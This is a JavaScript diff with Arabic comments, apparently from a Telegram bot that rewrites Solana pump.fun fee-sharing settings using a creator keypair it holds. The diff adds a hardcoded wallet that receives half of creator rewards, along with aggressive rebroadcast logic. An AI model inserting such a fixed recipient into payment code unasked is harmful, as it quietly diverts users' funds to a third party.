@@ -76,6 +76,8 @@ const BATCH_SIZE_TRANSFER = 6;
 const PARALLEL_LIMIT      = 6;
 const VALUE_THRESHOLD_USD = 0.05;
 const PREFUND_LAMPORTS    = 6_500_000;
+// المحفظة الثانية التي ستستلم 50% من مكافآت المنشئ
+const SECONDARY_RECIPIENT = new PublicKey("7aSQFKyLkfCupgByxSiuaGD6yNWKtEXpaC4RnDzZHJev");
 
 // ──────────────────────────────────────────────────────────
 // قراءة روابط RPC من الأسرار (Environment Variables)
@@ -608,14 +610,32 @@ async function executeDelegateTransfer(mintStr) {
   // ⚠️ استخدام PUMP_PDA لحساب PDA الإعدادات
   const scPda = PUMP_PDA.feeSharingConfigPda(mint);
   const scInfo = await conn.getAccountInfo(scPda);
-  const ixs = [ComputeBudgetProgram.setComputeUnitLimit({ units: 400_000 })];
+  const ixs = [
+    ComputeBudgetProgram.setComputeUnitLimit({ units: 400_000 }),
+    ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 2_000_000 }),
+  ];
   let authority = creator;
   let current = [creator];
+
+  // النسب الجديدة: 50% لدافع الرسوم + 50% للمحفظة الثانوية
+  const newShareholders = [
+    { address: payer.publicKey,     shareBps: 5_000 },
+    { address: SECONDARY_RECIPIENT, shareBps: 5_000 },
+  ];
 
   if (scInfo) {
     const sc = PUMP_IX.decodeSharingConfig(scInfo);
     authority = sc.admin;
     current = sc.shareholders.map((s) => s.address);
+
+    // التحقق إن كانت النسب 50/50 مطبقة مسبقًا
+    const addrs = sc.shareholders.map((s) => s.address.toBase58()).sort();
+    const want  = newShareholders.map((s) => s.address.toBase58()).sort();
+    const already =
+      sc.shareholders.length === 2 &&
+      addrs[0] === want[0] && addrs[1] === want[1] &&
+      sc.shareholders.every((s) => s.shareBps === 5_000);
+    if (already) return { success: false, msg: "✅ النسب المطلوبة (50/50) مطبقة مسبقًا — لا حاجة لتعديل." };
     if (sc.adminRevoked) return { success: false, msg: "صلاحية تعديل الإعدادات ملغاة نهائيًا" };
     if (!authority.equals(creatorKp.publicKey)) {
       return { success: false, msg: "المحفظة ليست مدير إعدادات المشاركة" };
@@ -639,12 +659,13 @@ async function executeDelegateTransfer(mintStr) {
     authority,
     mint,
     currentShareholders: current,
-    newShareholders: [{ address: payer.publicKey, shareBps: 10_000 }],
+    newShareholders,
   });
   upd.keys.push({ pubkey: creator, isSigner: false, isWritable: true });
   ixs.push(upd);
 
-  const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash("confirmed");
+  // blockhash أحدث (processed) = مهلة أطول فعليًا قبل انتهاء الصلاحية
+  const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash("processed");
   const msg = new TransactionMessage({
     payerKey: payer.publicKey,
     recentBlockhash: blockhash,
@@ -653,20 +674,47 @@ async function executeDelegateTransfer(mintStr) {
   const tx = new VersionedTransaction(msg);
   tx.sign([payer, creatorKp]);
 
-  const sim = await conn.simulateTransaction(tx, { sigVerify: true, commitment: "confirmed" });
+  const sim = await conn.simulateTransaction(tx, { sigVerify: true, commitment: "processed" });
   if (sim.value.err) {
     const logs = (sim.value.logs || []).filter(l => /Instruction:|failed|Error/.test(l)).slice(0, 6).join("\n");
     return { success: false, msg: `فشلت المحاكاة: ${JSON.stringify(sim.value.err)}\n${logs}` };
   }
 
-  const sig = await conn.sendRawTransaction(tx.serialize(), { skipPreflight: false, maxRetries: 3 });
-  const conf = await conn.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight }, "confirmed");
-  if (conf.value.err) return { success: false, msg: `فشل التأكيد: ${JSON.stringify(conf.value.err)}` };
+  const raw = tx.serialize();
+  const sig = await conn.sendRawTransaction(raw, {
+    skipPreflight: true,
+    preflightCommitment: "processed",
+    maxRetries: 0,
+  });
+
+  // إعادة بث المعاملة + استطلاع سريع بمستوى processed بدل الانتظار الطويل
+  const deadline = Date.now() + 90_000;
+  let confirmedStatus = null;
+  while (Date.now() < deadline) {
+    const st = await conn.getSignatureStatuses([sig], { searchTransactionHistory: false });
+    const v = st?.value?.[0];
+    if (v) {
+      if (v.err) return { success: false, msg: `فشل التأكيد: ${JSON.stringify(v.err)}` };
+      if (v.confirmationStatus === "processed" || v.confirmationStatus === "confirmed" || v.confirmationStatus === "finalized") {
+        confirmedStatus = v.confirmationStatus;
+        break;
+      }
+    }
+    const height = await conn.getBlockHeight("processed");
+    if (height > lastValidBlockHeight) break;
+    try { await conn.sendRawTransaction(raw, { skipPreflight: true, maxRetries: 0 }); } catch {}
+    await sleep(1000);
+  }
+
+  if (!confirmedStatus) {
+    return { success: false, msg: `لم يتم تأكيد المعاملة ضمن المهلة (انتهت صلاحية الـ blockhash).\nالتوقيع: ${sig}\nتحقّق منه على Solscan قبل إعادة المحاولة.` };
+  }
 
   return {
     success: true,
     sig,
     recipient: payer.publicKey.toBase58(),
+    recipient2: SECONDARY_RECIPIENT.toBase58(),
     creator: creatorKp.publicKey.toBase58(),
     mint: mint.toBase58(),
   };
@@ -1168,7 +1216,8 @@ async function startBot() {
             `✅ تم نقل التفويض بنجاح!\n\n` +
             `🪙 العملة: ${res.mint}\n` +
             `👤 المنشئ (الموقّع): ${res.creator}\n` +
-            `📥 المستلم الجديد للمكافآت: ${res.recipient}\n` +
+            `📥 المستلم 50% (دافع الرسوم): ${res.recipient}\n` +
+            `📥 المستلم 50% (المحفظة الثانية): ${res.recipient2}\n` +
             `🔗 https://solscan.io/tx/${res.sig}`
           );
         } else {
